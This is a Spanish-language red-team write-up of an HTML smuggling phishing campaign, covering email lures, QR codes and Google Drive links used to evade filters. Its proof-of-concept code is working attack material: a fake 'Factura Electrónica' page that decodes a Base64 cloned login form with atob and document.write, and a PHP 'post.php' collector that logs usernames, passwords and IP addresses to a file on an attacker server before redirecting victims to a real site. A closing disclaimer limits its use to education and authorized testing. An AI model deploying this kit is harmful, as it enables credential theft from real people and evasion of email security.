Técnica de Evasión: HTML Smuggling & Sandbox Bypass

🕵️‍♂️ Resumen de la Técnica

Esta técnica utiliza HTML Smuggling para evadir filtros de correo electrónico (SEG) y Sandboxes corporativos. En lugar de adjuntar un archivo malicioso que sería detectado por el antivirus perimetral, se envía un código HTML benigno que "construye" el payload malicioso localmente en el navegador de la víctima utilizando JavaScript y Base64.

⛓️ Kill Chain (Flujo de Ataque)

Vector de Entrega: Correo legítimo (Gmail) con ingeniería social (Factura Urgente).

Evasión de URL: Uso de Códigos QR y enlaces a Google Drive (dominio confiable) para evitar listas negras.

Descarga Anidada: PDF en Drive -> ZIP en Drive -> Archivo .html.

Ejecución Local: El archivo HTML se abre en el navegador. No hay tráfico de red sospechoso porque el archivo se genera en la memoria del cliente.

Exfiltración: Formulario HTML puro que envía los datos (POST) a un VPS controlado (C2).

sequenceDiagram
    participant Atacante
    participant Victima as Víctima (Navegador)
    participant C2 as Servidor C2 (VPS)
    
    Note over Atacante, Victima: 1. Ingeniería Social
    Atacante->>Victima: Envía Email (Enlace a Drive/QR)
    
    Note over Victima: 2. HTML Smuggling
    Victima->>Victima: Descarga HTML benigno
    Victima->>Victima: JS decodifica Base64 en memoria (Blob)
    Victima->>Victima: Renderiza Formulario Falso
    
    Note over Victima, C2: 3. Exfiltración
    Victima->>C2: Envía credenciales (POST)
    C2-->>Victima: Redirige a sitio legítimo


💻 Código de la Prueba de Concepto (PoC)

El siguiente código muestra cómo se utiliza JavaScript para decodificar un payload en Base64 y reescribir el documento (document.write) en tiempo real.

<!DOCTYPE html>
<html lang="es">
<head>
    <title>Factura Electrónica - Visualización Segura</title>
</head>
<body>
    <script>
        // --------------------------------------------------------
        // TÉCNICA DE SMUGGLING:
        // El contenido malicioso (Formulario clonado) está cifrado en Base64.
        // Los filtros de seguridad solo ven una cadena de texto sin sentido.
        // --------------------------------------------------------

        // Payload codificado (Simulación de Login Clonado)
        // Este string base64 se decodifica en un formulario HTML al ejecutarse.
        // REEMPLAZAR CON TU PROPIA CADENA BASE64 SI ES NECESARIO
        var payload_b64 = "PGh0bW... (CONTENIDO_BASE64_DEL_FORMULARIO) ..."; 

        // Decodificación dinámica en el cliente (Client-Side Assembly)
        // atob() decodifica Base64 a String
        var contenido_real = atob(payload_b64);

        // Inyección en el DOM
        // document.write sobrescribe el contenido actual
        document.open();
        document.write(contenido_real);
        document.close();

        // NOTA: Al ejecutarse en local (file:// o blob:),
        // muchas soluciones de seguridad no inspeccionan el tráfico generado.
    </script>
</body>
</html>


⚙️ Infraestructura de Recepción (C2)

El atacante levanta un servidor ligero (Apache/Nginx) con un script PHP para capturar las credenciales enviadas por el formulario inyectado.

Script de Captura (post.php):

<?php
// Recepción de credenciales en texto plano
$file = 'capturas.txt';

// Verificamos si llegan datos por POST
if(isset($_POST['user']) && isset($_POST['pass'])) {
    $data = "User: " . $_POST['user'] . " | Pass: " . $_POST['pass'] . " | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";

    // Guardado persistente en el servidor atacante
    file_put_contents($file, $data, FILE_APPEND);
}

// Redirección final para no levantar sospechas (a la web real)
header("Location: [https://sitio-legitimo.com](https://sitio-legitimo.com)");
exit();
?>


⚠️ DISCLAIMER: Esta documentación demuestra técnicas avanzadas de evasión únicamente con fines educativos y para pruebas de Red Teaming autorizadas. El uso de HTML Smuggling contra objetivos sin su consentimiento explícito es ilegal y antiético.
